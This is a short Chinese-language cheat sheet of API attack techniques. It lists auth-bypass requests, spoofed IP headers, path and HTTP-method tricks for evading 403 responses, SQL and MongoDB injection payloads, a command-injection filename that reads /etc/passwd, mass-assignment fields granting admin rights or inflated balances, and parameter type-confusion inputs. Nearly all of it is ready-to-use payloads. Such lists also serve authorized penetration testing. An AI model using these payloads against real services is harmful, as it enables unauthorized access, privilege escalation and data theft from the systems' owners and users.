# API 认证绕过与参数攻击

## 未认证访问
去掉认证头直接请求每个端点：
```
GET /api/users → 401
GET /api/public/users → 200？（绕过）
GET /api/v1/internal/users → 200？（内部端点未保护）
```

## 绕过技巧
```
# IP 白名单绕过
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# 路径绕过
/api/admin → 403
/api/Admin → 200？
/api/admin/ → 200？（trailing slash）
/api//admin → 200？（double slash）
/api/admin%20 → 200？（URL编码空格）
/api/admin;.js → 200？（Nginx/Tomcat 解析差异）

# 方法绕过
GET /api/admin → 403
POST /api/admin → 200？
OPTIONS /api/admin → 返回 Allow 头暴露可用方法
```

## 注入测试
```json
// SQL 注入
{"search": "' OR 1=1--"}
{"id": "1 UNION SELECT 1,2,3--"}

// NoSQL 注入（MongoDB）
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin.*"}}

// 命令注入
{"filename": "test; cat /etc/passwd"}
```

## 批量赋值（Mass Assignment）
注册/更新时添加额外字段：
```json
{"username": "test", "password": "pass", "role": "admin"}
{"username": "test", "password": "pass", "is_admin": true}
{"username": "test", "password": "pass", "balance": 999999}
```

## 参数类型混淆
```
id=1        → id[]=1（数组）
id=1        → id={"$gt":0}（对象/NoSQL）
limit=10    → limit=999999（大量数据泄露）
page=1      → page=-1（负数）
```
